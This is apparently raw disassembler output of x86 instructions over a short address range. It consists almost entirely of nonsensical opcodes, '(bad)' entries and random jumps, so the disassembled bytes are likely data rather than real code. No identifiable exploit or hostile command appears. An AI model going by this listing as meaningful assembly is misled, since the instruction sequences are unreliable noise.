  426556:	shr    DWORD PTR [eax-0x138e9e0a],cl
  42655c:	cs mov edx,0x98c04c32
  426562:	push   0x5fffecc
  426567:	xchg   edi,eax
  426568:	mov    dl,0xd0
  42656a:	sahf   
  42656b:	dec    ebx
  42656c:	add    DWORD PTR [esi-0x42bee4cf],0x16
  426573:	jnp    0x42656e
  426575:	retf   
  426576:	cmp    dl,BYTE PTR [ecx]
  426578:	dec    eax
  426579:	(bad)  
  42657a:	xor    bl,BYTE PTR [esi]
  42657c:	dec    ecx
  42657d:	jns    0x426568
  42657f:	and    bh,BYTE PTR ss:[ebp-0x30]
  426583:	xchg   esi,eax
  426584:	or     eax,0xda4acedd
  426589:	mov    bh,0x39
  42658b:	sbb    ah,BYTE PTR [edx]
  42658d:	xlat   BYTE PTR ds:[ebx]
  42658e:	add    eax,0xf0a95a49
  426593:	popf   
  426594:	xor    al,0x21
  426596:	(bad)  
  426597:	jne    0x4265ff
  426599:	(bad)  
  42659a:	jmp    0x426579
  42659c:	stos   DWORD PTR es:[edi],eax
  42659d:	vcmpps ymm1,ymm2,YMMWORD PTR [edi+0x53879f1a],0xb1
  4265a6:	sub    BYTE PTR [ecx+0x7a],dl
  4265a9:	or     ecx,DWORD PTR ds:0x13fcd99d
  4265af:	loope  0x426542
  4265b1:	adc    al,0x86
  4265b3:	add    bh,ch
  4265b5:	inc    ecx
  4265b6:	pusha  
  4265b7:	(bad)  
  4265b8:	mov    bh,0x76
  4265ba:	mov    ebx,0xb4ecd368
  4265bf:	shl    DWORD PTR [esi+0x7e],cl
  4265c2:	pushf  
  4265c3:	jmp    0x988dc5cc
  4265c8:	cli    
  4265c9:	std    
  4265ca:	sahf   
  4265cb:	mul    DWORD PTR [eax*4+0x128af7d]
  4265d2:	(bad)  
  4265d3:	mov    al,ds:0x139d13bd
  4265d8:	xor    eax,0xb6298f14
  4265dd:	dec    ecx
  4265de:	fsub   st,st(6)
  4265e0:	jne    0x4265bd
  4265e2:	and    edi,ebx
  4265e4:	xor    BYTE PTR [edx],ah
  4265e6:	sub    cl,bh
  4265e8:	xor    DWORD PTR [esi+eax*4+0x5814a8e8],0xde623095
  4265f3:	out    0xe0,al
  4265f5:	pop    ebx
  4265f6:	jle    0x42662a
  4265f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f9:	push   cs
  4265fa:	out    dx,eax
  4265fb:	pop    eax
  4265fc:	in     al,0x52
  4265fe:	lods   al,BYTE PTR ds:[esi]
  4265ff:	into   
  426600:	inc    ecx
  426601:	pop    eax
  426602:	xchg   esi,eax
  426603:	xchg   DWORD PTR [ecx-0xd3d7f59],edx
  426609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42660a:	dec    ebx
  42660b:	or     eax,DWORD PTR [ebp-0x1b676a0d]
  426611:	mul    ah
  426613:	inc    ebp
  426614:	mov    eax,ds:0xbdb0a5ab
  426619:	test   eax,0x54df046f
  42661e:	and    bl,BYTE PTR [ecx-0x31]
  426621:	imul   esp,DWORD PTR [ebx+ecx*2+0x500754b8],0xd
  426629:	adc    al,0x2c
  42662b:	jns    0x426689
  42662d:	dec    esp
  42662e:	ret    
  42662f:	outs   dx,DWORD PTR ds:[esi]
  426630:	pop    ecx
  426631:	sbb    DWORD PTR [eax+0x2b23c81d],ecx
  426637:	rcr    BYTE PTR [ebp+0x4c],1
  42663a:	xor    esp,edx
  42663c:	call   0x3e6aa109
	...
  4266b1:	add    BYTE PTR [eax],al
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	and    bh,BYTE PTR [ebp+0x2d]
  4266c3:	xchg   edx,eax
  4266c4:	sbb    DWORD PTR [eax+0xf50001],0x0
  4266cb:	add    BYTE PTR ds:0xdbac0270,dl
  4266d1:	bound  ebx,QWORD PTR [esp+eax*1]
  4266d4:	adc    cl,al
  4266d6:	mov    ds:0x22daab16,al
  4266db:	mov    ebx,0x249530ea
  4266e0:	in     al,dx
  4266e1:	call   FWORD PTR [eax]
  4266e3:	adc    al,0xea
  4266e5:	(bad)
  4266e8:	std    
  4266e9:	add    DWORD PTR [ebx+0x303f1156],ebx
  4266ef:	jb     0x426729
  4266f1:	add    ebx,DWORD PTR [ebx-0x78]
  4266f4:	mov    al,0x7c
  4266f6:	mov    eax,0x8aec4876
  4266fb:	test   BYTE PTR [ecx],ch
  4266fd:	dec    edx
  4266fe:	jns    0x42672a
  426700:	jmp    0xb3f7:0xaef7131c
  426707:	adc    DWORD PTR [ebp-0x7f2f28a],ebx
  42670d:	outs   dx,DWORD PTR ds:[esi]
  42670e:	push   ecx
  42670f:	mov    BYTE PTR [ebx],dh
  426711:	pop    ds
  426712:	cwde   
  426713:	add    ch,BYTE PTR [edi]
  426715:	pop    DWORD PTR [edi-0x6ee69045]
  42671b:	jmp    0x7d65:0x1594bb72
  426722:	pcmpeqb mm5,mm1
  426725:	push   edi
  426726:	pop    esp
  426727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426728:	inc    eax
  426729:	jecxz  0x4266ce
  42672b:	clc    
  42672c:	pop    edi
  42672d:	sbb    eax,0x48e8d540
  426732:	mov    esi,ecx
  426734:	sub    BYTE PTR [edx+edi*8],dl
  426737:	iret   
  426738:	scas   al,BYTE PTR es:[edi]
  426739:	sti    
  42673a:	mov    ebx,0x81e241ab
  42673f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426740:	call   0x358c0530
  426745:	jns    0x426755
  426747:	mov    eax,0x9591317a
  42674c:	add    eax,DWORD PTR [ecx]
  42674e:	jne    0x4267a0
  426750:	inc    ecx
  426751:	jg     0x426759
  426753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426754:	push   0x98c251f5
  426759:	mov    dl,0x9
  42675b:	arpl   WORD PTR [edx+eax*4+0x69a4d8ac],bp
  426762:	pslld  mm7,QWORD PTR [ebx+0x17]
  426766:	imul   DWORD PTR [ecx-0x7a]
  426769:	sub    eax,0x56f75b59
  42676e:	mov    WORD PTR [eax],ss
  426770:	add    DWORD PTR [edi+0x5d],eax
  426773:	or     al,0x8e
  426775:	outs   dx,DWORD PTR ds:[esi]
  426776:	int3   
  426777:	cmp    eax,0x289d2320
  42677c:	leave  
  42677d:	je     0x426701
  42677f:	rcr    DWORD PTR [edi+0x545d5410],cl
  426785:	int3   
  426786:	bound  edx,QWORD PTR [ecx+0x4c72830f]
  42678c:	add    al,0x99
  42678e:	inc    eax
  42678f:	in     eax,dx
  426790:	adc    edx,DWORD PTR [edx]
  426792:	push   ds
  426793:	rcr    BYTE PTR [edi+0x52cd05d7],cl
  426799:	adc    BYTE PTR [edi-0x1d],ah
  42679c:	xchg   DWORD PTR [ebp-0x2160fb2b],esi
  4267a2:	hlt    
  4267a3:	push   ds
  4267a4:	cmc    
  4267a5:	xor    DWORD PTR es:[edx-0x68d5d30c],edx
  4267ac:	sub    ah,BYTE PTR [esi]
  4267ae:	sub    BYTE PTR [ecx+0x57],0xbc
  4267b2:	add    eax,0xb6baac0e
  4267b7:	nop
  4267b8:	mov    ds:0x2e89065f,eax
  4267bd:	xchg   edi,eax
  4267be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267bf:	mov    ecx,0xf8
	...
  426834:	pop    esp
  426835:	push   edx
  426836:	nop
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x2ab24834],cl
  426843:	inc    ebx
  426844:	js     0x4267df
  426846:	add    DWORD PTR [eax],eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
  42684b:	add    BYTE PTR [ebp-0xa],bl
  42684e:	xchg   edx,eax
  42684f:	or     eax,0xe08ea552
  426854:	pop    esi
  426855:	ins    BYTE PTR es:[edi],dx
  426856:	adc    al,0xf
  426858:	out    0xe5,eax
  42685a:	pop    edx
  42685b:	ret    0xe87d
  42685e:	jp     0x4268cb
  426860:	loope  0x42689d
  426862:	mov    cl,0xdc
  426864:	aas    
  426865:	pop    ss
  426866:	push   cs
  426867:	loop   0x4268ca
  426869:	add    eax,0x83d3143c
  42686e:	dec    eax
  42686f:	arpl   WORD PTR [ebx+0x1e],ax
  426872:	mov    BYTE PTR [esi+0x3fb54fc4],cl
  426878:	sahf   
  426879:	add    BYTE PTR es:[eax-0x3fbbd3ac],dl
  426880:	scas   al,BYTE PTR es:[edi]
  426881:	test   eax,0x5aec610f
  426886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426887:	jg     0x4268bc
  426889:	adc    DWORD PTR [esi+0x7d],ecx
  42688c:	test   BYTE PTR [ecx-0x316e39fa],0xc4
  426893:	fimul  DWORD PTR [ebx+0x2d]
  426896:	test   eax,0xd97ed782
  42689b:	and    ah,BYTE PTR [ebx]
  42689d:	jne    0x4268c1
  42689f:	sub    eax,0xbffe9837
  4268a4:	mov    bh,0x7f
  4268a6:	xchg   DWORD PTR ds:0x98032888,esp
  4268ac:	sub    eax,DWORD PTR [ecx+0x64]
  4268af:	mov    eax,ds:0xfec17c8d
  4268b4:	in     al,dx
  4268b5:	add    ecx,edx
  4268b7:	out    dx,eax
  4268b8:	retf   
  4268b9:	sbb    eax,0x5eedb202
  4268be:	mov    edi,0x2d255d41
  4268c3:	inc    ecx
  4268c4:	mov    eax,0x5c8cbd3a
  4268c9:	out    dx,eax
  4268ca:	sti    
  4268cb:	and    al,0xeb
  4268cd:	fcomp  st(1)
  4268cf:	add    BYTE PTR [edx+0x5b],bl
  4268d2:	push   ds
  4268d3:	sub    ch,al
  4268d5:	or     eax,ecx
  4268d7:	lock and al,0x54
  4268da:	ror    BYTE PTR [esi+0x2288d3e8],cl
  4268e0:	or     eax,0xbda0d087
  4268e5:	add    al,0x54
  4268e7:	and    BYTE PTR [eax],dh
  4268e9:	mov    ecx,0xcab14ff8
  4268ee:	cmp    BYTE PTR [esp+ebx*2-0x5f],bl
  4268f2:	sbb    dh,0x8d
  4268f5:	sahf   
  4268f6:	int    0x5a
  4268f8:	icebp  
  4268f9:	push   ebx
  4268fa:	sub    al,0x16
  4268fc:	inc    edx
  4268fd:	test   esi,esp
  4268ff:	loop   0x426956
  426901:	push   edx
  426902:	dec    ebx
  426903:	sbb    edx,0xffffff94
  426906:	fmul   DWORD PTR [ecx+eiz*2]
  426909:	xor    esi,DWORD PTR [esp+edx*2+0x127106af]
  426910:	lods   eax,DWORD PTR ds:[esi]
  426911:	js     0x426924
  426913:	adc    cl,BYTE PTR [esi+0x30]
  426916:	inc    eax
  426917:	jecxz  0x42691d
  426919:	(bad)  
  42691a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42691b:	in     eax,0x72
  42691d:	xchg   ebx,esp
  42691f:	pop    es
  426920:	jne    0x4269a0
  426922:	sub    BYTE PTR [eax+0xee2c6c3],dl
  426928:	jbe    0x4268c8
  42692a:	dec    esp
  42692b:	xor    BYTE PTR [ebx+0x40],ch
  42692e:	jg     0x426988
  426930:	mov    al,ds:0xaa9f40ae
  426935:	cli    
  426936:	and    DWORD PTR [ecx-0x37],esi
  426939:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42693b:	in     eax,0x13
  42693d:	inc    edx
  42693e:	fstp   TBYTE PTR [edx+0xe]
	...
  4269b1:	add    BYTE PTR [eax],al
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	and    cl,BYTE PTR [edi-0x65924f62]
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	cmc    
  4269c9:	add    BYTE PTR [eax],al
  4269cb:	add    BYTE PTR [ebp+0x4a08118f],al
  4269d1:	sub    DWORD PTR [edi-0x59],edx
  4269d4:	cli    
  4269d5:	mov    dh,BYTE PTR [edi]
  4269d7:	leave  
  4269d8:	push   eax
  4269d9:	aam    0x4
  4269db:	sub    BYTE PTR [ebp+0x7b0e0203],0xb8
  4269e2:	das    
  4269e3:	into   
  4269e4:	scas   eax,DWORD PTR es:[edi]
  4269e5:	add    DWORD PTR [esi+ecx*4-0x1a345ed9],ebx
  4269ec:	ins    BYTE PTR es:[edi],dx
  4269ed:	stos   DWORD PTR es:[edi],eax
  4269ee:	popa   
  4269ef:	xchg   esp,eax
  4269f0:	shr    BYTE PTR [ecx+0x3244e367],cl
  4269f6:	cmp    BYTE PTR [ebx+0x15],cl
  4269f9:	dec    edi
  4269fa:	mov    DWORD PTR ds:0x477e9dde,ebp
  426a00:	or     dh,bh
  426a02:	call   0xa6a7:0x86f3b723
  426a09:	mov    ecx,0xfa9e944f
  426a0e:	mov    edi,0x4f426169
  426a13:	fs xchg ebp,eax
  426a15:	std    
  426a16:	retf   0x1e84
  426a19:	adc    BYTE PTR [ebx-0x5b2b36c],dl
  426a1f:	adc    BYTE PTR es:[eax],ch
  426a22:	pop    ebx
  426a23:	shl    BYTE PTR ds:[ebp+0x5c],1
  426a27:	test   BYTE PTR [esi-0x49],al
  426a2a:	fimul  DWORD PTR [edi+eax*8]
  426a2d:	mov    BYTE PTR [esp+edi*8-0x72],cl
  426a31:	pop    esi
  426a32:	sti    
  426a33:	iret   
  426a34:	(bad)  
  426a35:	nop
  426a36:	ins    BYTE PTR es:[edi],dx
  426a37:	(bad)  
  426a38:	push   edx
  426a39:	pop    esi
  426a3a:	adc    DWORD PTR [ecx+ecx*4-0x207b4d8],edi
  426a41:	and    al,0xba
  426a43:	push   edi
  426a44:	or     eax,DWORD PTR [ebp+ebx*8+0x28]
  426a48:	arpl   sp,sp
  426a4a:	pop    esp
  426a4b:	es in  al,dx
  426a4d:	lods   eax,DWORD PTR ds:[esi]
  426a4e:	cmp    eax,0xbb044491
  426a53:	stos   DWORD PTR es:[edi],eax
  426a54:	cwde   
  426a55:	fptan  
  426a57:	inc    eax
  426a58:	jnp    0x426abc
  426a5a:	aaa    
  426a5b:	es sbb esi,eax
  426a5e:	(bad)  
  426a5f:	ja     0x426a5a
  426a61:	mov    dh,0x4
  426a63:	or     BYTE PTR [ecx],dl
  426a65:	lods   al,BYTE PTR ds:[esi]
  426a66:	sbb    al,0xc9
  426a68:	dec    ecx
  426a69:	fild   WORD PTR [edi+0x7d]
  426a6c:	std    
  426a6d:	mov    eax,ds:0x55989dd9
  426a72:	lea    ecx,[ecx]
  426a74:	hlt    
  426a75:	js     0x426ad0
  426a77:	rol    BYTE PTR [eax],1
  426a79:	ror    edi,1
  426a7b:	jmp    0x2104bdbe
  426a80:	push   ebx
  426a81:	nop
  426a82:	xchg   esi,esp
  426a84:	stc    
  426a85:	retf   
  426a86:	repz dec edx
  426a88:	loopne 0x426aa2
  426a8a:	mov    ah,BYTE PTR [ebp-0x53]
  426a8d:	sbb    esi,esp
  426a8f:	out    dx,al
  426a90:	jnp    0x426a43
  426a92:	jmp    0x78a36e2
  426a97:	lahf   
  426a98:	cs aaa 
  426a9a:	mov    eax,ds:0x8c988d7e
  426a9f:	cmp    DWORD PTR [edi+0x6f],ebx
  426aa2:	mov    esi,0xb890e2b
  426aa7:	std    
  426aa8:	aas    
  426aa9:	push   ds
  426aaa:	cwde   
  426aab:	fidiv  WORD PTR gs:[edi]
  426aae:	fcomi  st,st(2)
  426ab0:	data16 aas 
  426ab2:	(bad)  
  426ab3:	and    esi,DWORD PTR [ebp-0x7b]
  426ab6:	inc    esi
  426ab7:	sbb    cl,BYTE PTR [ecx]
  426ab9:	call   FWORD PTR [ebp-0x142ce5c5]
  426abf:	fld    DWORD PTR ds:0x0
	...
  426b31:	add    BYTE PTR [eax],al
  426b33:	add    ah,al
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	fwait
  426b41:	inc    ebp
  426b42:	cmp    BYTE PTR [ebx+0x62],bl
  426b45:	fwait
  426b46:	add    DWORD PTR [eax],eax
  426b48:	cmc    
  426b49:	add    BYTE PTR [eax],al
  426b4b:	add    bl,dl
  426b4d:	bound  esi,QWORD PTR [ecx+0x4a]
  426b50:	int3   
  426b51:	out    0x44,eax
  426b53:	inc    edi
  426b54:	ins    DWORD PTR es:[edi],dx
  426b55:	cmp    al,0xb3
  426b57:	stos   BYTE PTR es:[edi],al
  426b58:	xor    al,BYTE PTR [esi+0x47e54947]
  426b5e:	sub    al,0x1f
  426b60:	jo     0x426b23
  426b62:	enter  0x7928,0x27
  426b66:	outs   dx,BYTE PTR ds:[esi]
  426b67:	popa   
  426b68:	mov    al,0x35
  426b6a:	repz xor bh,BYTE PTR [eax+eiz*4+0x485b3100]
  426b72:	cld    
  426b73:	mov    dl,0x26
  426b75:	pop    ss
  426b76:	adc    eax,0xbb978c6f
  426b7b:	and    BYTE PTR [edi+ecx*4],0xa1
  426b7f:	jns    0x426b33
  426b81:	mov    esp,0x6d824f3f
  426b86:	mov    ebp,0x3648b37e
  426b8b:	repz add eax,0x981ed7ea
  426b91:	out    dx,eax
  426b92:	(bad)  
  426b93:	(bad)  
  426b94:	pop    ebp
  426b95:	mov    cl,0x90
  426b97:	outs   dx,BYTE PTR ds:[esi]
  426b98:	add    DWORD PTR [esi],ebx
  426b9a:	sub    eax,0x3a1a62e2
  426b9f:	or     esp,DWORD PTR [ebx+0x77]
  426ba2:	rol    BYTE PTR [ebx],1
  426ba4:	push   edx
  426ba5:	mov    dh,0xb1
  426ba7:	jbe    0x426bf2
  426ba9:	repnz fmul st,st(5)
  426bac:	xchg   edi,eax
  426bad:	sbb    edi,eax
  426baf:	and    ah,BYTE PTR [edi+0x65]
  426bb2:	pop    es
  426bb3:	(bad)  
  426bb4:	aas    
  426bb5:	fidiv  WORD PTR [ecx]
  426bb7:	not    DWORD PTR [esi-0x69]
  426bba:	loopne 0x426c0a
  426bbc:	xchg   esp,eax
  426bbd:	lods   eax,DWORD PTR ds:[esi]
  426bbe:	rcl    dh,1
  426bc0:	sahf   
  426bc1:	and    dh,BYTE PTR [ecx+0x76]
  426bc4:	mov    ch,BYTE PTR [esi]
  426bc6:	stos   BYTE PTR es:[edi],al
  426bc7:	push   0x60
  426bc9:	shl    DWORD PTR [ebp+ebx*4+0x7b7056d0],cl
  426bd0:	outs   dx,DWORD PTR ds:[esi]
  426bd1:	jnp    0x426b81
  426bd3:	sub    DWORD PTR [ebx+0x54a137cb],ebp
  426bd9:	scas   al,BYTE PTR es:[edi]
  426bda:	ins    BYTE PTR es:[edi],dx
  426bdb:	push   edi
  426bdc:	push   cs
  426bdd:	into   
  426bde:	pop    es
  426bdf:	(bad)  
  426be0:	aas    
  426be1:	or     DWORD PTR [ebx-0x5f8c0cbd],ebp
  426be7:	adc    ebx,edx
  426be9:	retf   
  426bea:	push   ebx
  426beb:	add    al,0xab
  426bed:	outs   dx,BYTE PTR ds:[esi]
  426bee:	sub    BYTE PTR [ecx],ch
  426bf0:	call   0x4e2b00d8
  426bf5:	sti    
  426bf6:	je     0x426bf2
  426bf8:	sub    ebp,DWORD PTR [eax+ebx*1]
  426bfb:	xchg   BYTE PTR fs:[esp+eiz*2+0x565d4787],dl
  426c03:	into   
  426c04:	cdq    
  426c05:	into   
  426c06:	cwde   
  426c07:	mov    esp,DWORD PTR [edi+0x2e3d767c]
  426c0d:	push   0x94f49e7c
  426c12:	pop    ds
  426c13:	xchg   BYTE PTR [ecx+ecx*4],ch
  426c16:	aas    
  426c17:	push   ds
  426c18:	(bad)  
  426c19:	cmp    BYTE PTR [edx+eax*8+0x2],al
  426c1d:	jb     0x426c77
  426c1f:	pop    edx
  426c20:	jl     0x426c51
  426c22:	mov    edx,0x92362efe
  426c27:	jl     0x426bfb
  426c29:	pop    ebx
  426c2a:	clc    
  426c2b:	inc    esp
  426c2c:	fsubp  st(3),st
  426c2e:	xor    ch,ah
  426c30:	add    BYTE PTR [esi-0x2cf6e54f],dh
  426c36:	xchg   ebx,edx
  426c38:	jp     0x426ca0
  426c3a:	sti    
  426c3b:	repnz or DWORD PTR [ebp+0x2f5462],0x0
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	fptan  
  426cc2:	jo     0x426ccb
  426cc4:	push   edi
  426cc5:	pushf  
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	cmc    
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [ecx],bl
  426ccd:	xchg   ebp,eax
  426cce:	xchg   esp,eax
  426ccf:	repz in al,0xa1
  426cd2:	pop    es
  426cd3:	in     al,dx
  426cd4:	mov    dh,0x68
  426cd6:	outs   dx,DWORD PTR ds:[esi]
  426cd7:	aaa    
  426cd8:	cwde   
  426cd9:	adc    eax,0xffffffa6
  426cdc:	ss stos BYTE PTR es:[edi],al
  426cde:	outs   dx,BYTE PTR ds:[esi]
  426cdf:	jmp    0x10f3:0x760dc80f
  426ce6:	jle    0x426cbb
  426ce8:	xlat   BYTE PTR ds:[ebx]
  426ce9:	iret   
  426cea:	jns    0x426cd0
  426cec:	dec    edx
  426ced:	sbb    BYTE PTR [edx-0x28cfd59c],0xf9
  426cf4:	mov    esi,0x548f9bad
  426cf9:	xchg   esp,esp
  426cfb:	push   esp
  426cfc:	xor    BYTE PTR [esi+0x27],0x91
  426d00:	pop    ecx
  426d01:	(bad)  
  426d03:	jmp    0x426d5f
  426d05:	add    BYTE PTR ds:0x24a1f4dd,bh
  426d0b:	sub    BYTE PTR [ebx-0x6d],bh
  426d0e:	bound  ebx,QWORD PTR ds:[ecx-0x9be2ddd]
  426d15:	(bad)  
  426d16:	sbb    DWORD PTR [edx-0x8],esp
  426d19:	ins    BYTE PTR es:[edi],dx
  426d1a:	les    eax,FWORD PTR [esi]
  426d1c:	mov    eax,ds:0xaa49eddc
  426d21:	lahf   
  426d22:	ds pop ebp
  426d24:	mov    dl,BYTE PTR [esi-0x4bbacb71]
  426d2a:	inc    ebp
  426d2b:	pop    ebx
  426d2c:	sub    DWORD PTR [edi+0x51463c0e],0x680d32c4
  426d36:	jle    0x426cbe
  426d38:	pop    es
  426d39:	ror    cl,cl
  426d3b:	mov    ah,ch
  426d3d:	xabort 0x69
  426d40:	mov    ch,0x9e
  426d42:	loopne 0x426ce6
  426d44:	daa    
  426d45:	mov    BYTE PTR [ecx-0x32c3470c],dh
  426d4b:	dec    edx
  426d4c:	jge    0x426cfe
  426d4e:	sub    eax,0x4f2d3516
  426d53:	add    edx,ecx
  426d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d56:	adc    eax,0xbf2ef59e
  426d5b:	jmp    FWORD PTR [edx]
  426d5d:	ds push ebx
  426d5f:	mov    ?,WORD PTR gs:[edx-0x504a380f]
  426d66:	sti    
  426d67:	mov    esi,0x1abd23dc
  426d6c:	jnp    0x426d1d
  426d6e:	(bad)  
  426d6f:	nop
  426d70:	jne    0x426dc5
  426d72:	inc    esi
  426d73:	lahf   
  426d74:	mov    edi,0x2ac17022
  426d79:	pop    esp
  426d7a:	bound  edx,QWORD PTR [ebx-0xa]
  426d7d:	push   es
  426d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d7f:	test   eax,0x89fcf8d7
  426d84:	popf   
  426d85:	or     esi,ebx
  426d87:	call   0x4faea28d
  426d8c:	jbe    0x426d1d
  426d8e:	add    esp,edi
  426d90:	(bad)  
  426d91:	fadd   DWORD PTR [esi*2-0x5cc4e9c4]
  426d98:	in     eax,dx
  426d99:	add    eax,DWORD PTR [ebx]
  426d9b:	push   esi
  426d9c:	jno    0x426d23
  426d9e:	ja     0x426da8
  426da0:	das    
  426da1:	xchg   ebx,eax
  426da2:	and    BYTE PTR [ebx-0x16c3f2e7],0x14
  426da9:	pop    ss
  426daa:	push   ebx
  426dab:	outs   dx,DWORD PTR ds:[esi]
  426dac:	push   ecx
  426dad:	addr16 dec ebx
  426daf:	dec    esp
  426db0:	mov    edi,0x672c761d
  426db5:	scas   eax,DWORD PTR es:[edi]
  426db6:	inc    esi
  426db7:	ins    BYTE PTR es:[edi],dx
  426db8:	jmp    0x426dda
  426dba:	into   
  426dbb:	mov    al,ds:0x88f0add2
  426dc0:	rol    DWORD PTR [eax],cl
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	adc    ebp,DWORD PTR [ecx+0x63]
  426e43:	mov    edx,0x19d4c
  426e48:	cmc    
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR ds:0xf5782c72,ah
  426e51:	sub    DWORD PTR [edi],esp
  426e53:	inc    edi
  426e54:	mov    bl,0xca
  426e56:	sub    esp,DWORD PTR ds:0xbea50004
  426e5c:	call   0x7e4f:0x9c5ff889
  426e63:	mul    edx
  426e65:	(bad)  
  426e66:	shr    ebp,1
  426e68:	out    0x5c,al
  426e6a:	scas   eax,DWORD PTR es:[edi]
  426e6b:	hlt    
  426e6c:	ret    
  426e6d:	test   ch,dh
  426e6f:	push   0x92f5706c
  426e74:	jbe    0x426e3f
  426e76:	mov    al,0x98
  426e78:	loop   0x426e2c
  426e7a:	xchg   esp,eax
  426e7b:	sbb    ecx,DWORD PTR [edx-0x44ead4d6]
  426e81:	mov    bh,0xf3
  426e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e84:	push   ds
  426e85:	loope  0x426ec8
  426e87:	fs pop ds
  426e89:	rol    DWORD PTR [ebx+0x260172cd],cl
  426e8f:	mov    edx,0xd1b68b62
  426e94:	cmp    al,0x69
  426e96:	(bad)  
  426e97:	jge    0x426f04
  426e99:	test   al,0xa3
  426e9b:	in     eax,0x3d
  426e9d:	pop    edi
  426e9e:	push   eax
  426e9f:	inc    ebp
  426ea0:	adc    BYTE PTR [esi],cl
  426ea2:	add    dh,dh
  426ea4:	test   DWORD PTR [edx-0x85f6e65],edx
  426eaa:	pop    ebx
  426eab:	cmp    ah,bl
  426ead:	and    al,0x4c
  426eaf:	inc    BYTE PTR [edx-0x276c04e2]
  426eb5:	xor    ebx,DWORD PTR [edx+eax*8-0x47bb6a6c]
  426ebc:	mov    ds:0x1a1f3103,eax
  426ec1:	(bad)  
  426ec2:	leave  
  426ec3:	sub    BYTE PTR [edi],dl
  426ec5:	inc    ebx
  426ec6:	xor    BYTE PTR [edi],ch
  426ec8:	lods   eax,DWORD PTR ds:[esi]
  426ec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eca:	cmp    eax,0x87e1ba7a
  426ecf:	cs mov ecx,0xf4c7242c
  426ed5:	pop    esi
  426ed6:	fimul  DWORD PTR [ebp-0x63]
  426ed9:	out    0x5,eax
  426edb:	popf   
  426edc:	push   esp
  426edd:	clc    
  426ede:	dec    eax
  426edf:	cld    
  426ee0:	or     ah,dh
  426ee2:	add    DWORD PTR [edx],esp
  426ee4:	out    dx,eax
  426ee5:	cwde   
  426ee6:	push   ds
  426ee7:	jo     0x426e93
  426ee9:	stc    
  426eea:	or     edi,DWORD PTR [esi]
  426eec:	mov    al,ds:0x2e1ebdf5
  426ef1:	jecxz  0x426e84
  426ef3:	push   ebp
  426ef4:	shl    BYTE PTR [edx-0x7b],cl
  426ef7:	adc    al,0xd3
  426ef9:	imul   esi,DWORD PTR [edx-0x29],0x3b3c9913
  426f00:	ficomp DWORD PTR [ecx-0x43]
  426f03:	sbb    bh,BYTE PTR [esi-0x3a]
  426f06:	sub    ax,0xe4af
  426f0a:	lea    eax,[ebx]
  426f0c:	push   cs
  426f0d:	jmp    0x426f31
  426f0f:	inc    esp
  426f10:	pop    ebx
  426f11:	cmp    ah,BYTE PTR [ebx+0x60]
  426f14:	and    DWORD PTR [edx+0x60],0x7117e88e
  426f1b:	retf   0x9c0a
  426f1e:	mov    ebp,0x7f54d6d5
  426f23:	dec    edi
  426f24:	and    BYTE PTR [edi+0x303d385c],cl
  426f2a:	push   0x5a
  426f2c:	mov    DWORD PTR [eax-0x5742b640],ebx
  426f32:	rcr    DWORD PTR [esi+ebx*1+0x1c],0x17
  426f37:	or     BYTE PTR [edi+0x50154a29],0x8d
  426f3e:	inc    esp
  426f3f:	mov    edx,0x7b
	...
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	push   edi
  426fc1:	inc    esp
  426fc2:	scas   al,BYTE PTR es:[edi]
  426fc3:	sbb    al,0x41
  426fc5:	sahf   
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [edi],dl
  426fcd:	adc    ecx,DWORD PTR [ebp-0x53]
  426fd0:	pop    esi
  426fd1:	adc    ch,BYTE PTR [edx]
  426fd3:	xchg   edx,eax
  426fd4:	sbb    bl,BYTE PTR [edx]
  426fd6:	iret   
  426fd7:	dec    esi
  426fd8:	(bad)  [ebx]
  426fda:	pop    edx
  426fdb:	xchg   DWORD PTR [edi+0x75],ebp
  426fde:	shl    edx,1
